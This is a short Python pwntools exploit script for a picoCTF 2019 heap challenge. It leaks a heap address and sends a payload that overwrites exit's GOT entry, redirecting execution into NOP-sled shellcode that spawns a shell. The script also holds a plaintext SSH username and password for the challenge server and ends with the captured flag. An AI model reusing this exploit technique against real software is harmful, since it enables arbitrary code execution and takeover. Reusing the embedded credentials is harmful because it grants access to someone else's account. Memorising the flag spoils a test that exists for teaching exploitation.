from pwn import *
import sys

if len(sys.argv) < 2:
	r = process('./secondLife')
	raw_input('debug')
else:
	s = ssh(host = '2019shell1.picoctf.com', user = 'Linh169', password = 'mylinh1006')
	r = s.process('./vuln', cwd='/problems/secondlife_0_1d09c6c834e9512daebaf9e25feedd53')

r.recvuntil('decimal...')
res = r.recv(10)
leak = int(res)
log.info('heap = %#x' %leak)

r.sendline('abc')

exit_got = 0x804d02c
payload = p32(exit_got - 12) + p32(leak + 8)
payload += asm('''
	jmp sc
	{}
sc:
	nop
'''.format('nop\n'*50) + shellcraft.i386.linux.sh())
r.sendlineafter('an overflow will not be very useful...', payload )

r.interactive()
r.close()

# picoCTF{HeapHeapFlag_8342a39b}